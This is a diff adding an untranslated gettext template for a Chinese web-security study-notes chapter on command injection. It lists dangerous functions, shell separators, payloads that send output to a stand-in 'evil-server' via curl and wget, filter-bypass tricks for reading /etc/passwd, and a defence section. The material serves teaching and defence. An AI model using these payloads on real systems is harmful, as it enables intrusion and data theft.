@@ -1,0 +1,273 @@
+# SOME DESCRIPTIVE TITLE.
+# Copyright (C) 2019-2026, Lyle
+# This file is distributed under the same license as the Web安全学习笔记 package.
+# FIRST AUTHOR <EMAIL@ADDRESS>, 2026.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Report-Msgid-Bugs-To: \n"
+"POT-Creation-Date: 2026-06-17 07:02+0800\n"
+"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
+"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
+"Language: en\n"
+"Language-Team: en <LL@li.org>\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=utf-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Generated-By: Babel 2.18.0\n"
+
+#: ../../source/vuln/cmdinjection.rst:2
+msgid "命令注入"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:5
+msgid "简介"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:6
+msgid "命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:8
+msgid "该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:11
+msgid "常见危险函数"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:14
+msgid "PHP"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:15 ../../source/vuln/cmdinjection.rst:24
+msgid "system"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:16
+msgid "exec"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:17
+msgid "passthru"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:18
+msgid "shell_exec"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:19 ../../source/vuln/cmdinjection.rst:25
+msgid "popen"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:20
+msgid "proc_open"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:23
+msgid "Python"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:26
+msgid "subprocess.call"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:27
+msgid "spawn"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:30
+msgid "Java"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:31
+msgid "java.lang.Runtime.getRuntime().exec(command)"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:34
+msgid "常见注入方式"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:35
+msgid "分号分割"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:36
+msgid "``||`` ``&&`` ``&`` 分割"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:37
+msgid "``|`` 管道符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:38
+#, python-format
+msgid "``\\r\\n`` ``%d0%a0`` 换行"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:39
+msgid "反引号解析"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:40
+msgid "``$()`` 替换"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:43
+msgid "无回显技巧"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:44
+msgid "bash反弹shell"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:45
+msgid "DNS带外数据"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:46
+msgid "http带外"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:47
+msgid "``curl http://evil-server/$(whoami)``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:48
+msgid "``wget http://evil-server/$(whoami)``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:49
+msgid "无带外时利用 ``sleep`` 或其他逻辑构造布尔条件"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:52
+msgid "常见绕过方式"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:55
+msgid "空格绕过"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:56
+msgid "``<`` 符号 ``cat<123``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:57
+msgid "``\\t`` / ``%09``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:58
+#, python-brace-format
+msgid ""
+"``${IFS}`` "
+"其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:61
+msgid "黑名单绕过"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:62
+msgid "``a=l;b=s;$a$b``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:63
+msgid "base64 ``echo \"bHM=\" | base64 -d``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:64
+msgid "``/?in/?s`` => ``/bin/ls``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:65
+msgid "连接符 ``cat /etc/pass'w'd``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:66
+msgid "未定义的初始化变量 ``cat$x /etc/passwd``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:69
+msgid "长度限制绕过"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:78
+msgid ""
+"上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 "
+"直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls "
+"/usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec "
+"等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:85
+msgid "常用符号"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:88
+msgid "命令分隔符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:89
+#, python-format
+msgid "``%0a`` / ``%0d`` / ``\\n`` / ``\\r``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:90
+msgid "``;``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:91
+msgid "``&`` / ``&&``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:94
+msgid "通配符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:95
+msgid "``*`` 0到无穷个任意字符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:96
+msgid "``?`` 一个任意字符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:97
+msgid "``[ ]``  一个在括号内的字符，e.g. ``[abcd]``"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:98
+msgid "``[ - ]``  在编码顺序内的所有字符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:99
+msgid "``[^ ]`` 一个不在括号内的字符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:102
+msgid "防御"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:103
+msgid "不使用时禁用相应函数"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:104
+msgid "尽量不要执行外部的应用程序或命令"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:105
+msgid "做输入的格式检查"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:106
+msgid "转义命令中的所有shell元字符"
+msgstr ""
+
+#: ../../source/vuln/cmdinjection.rst:107
+#, python-brace-format
+msgid "shell元字符包括 ``#&;`,|*?~<>^()[]{}$\\``"
+msgstr ""
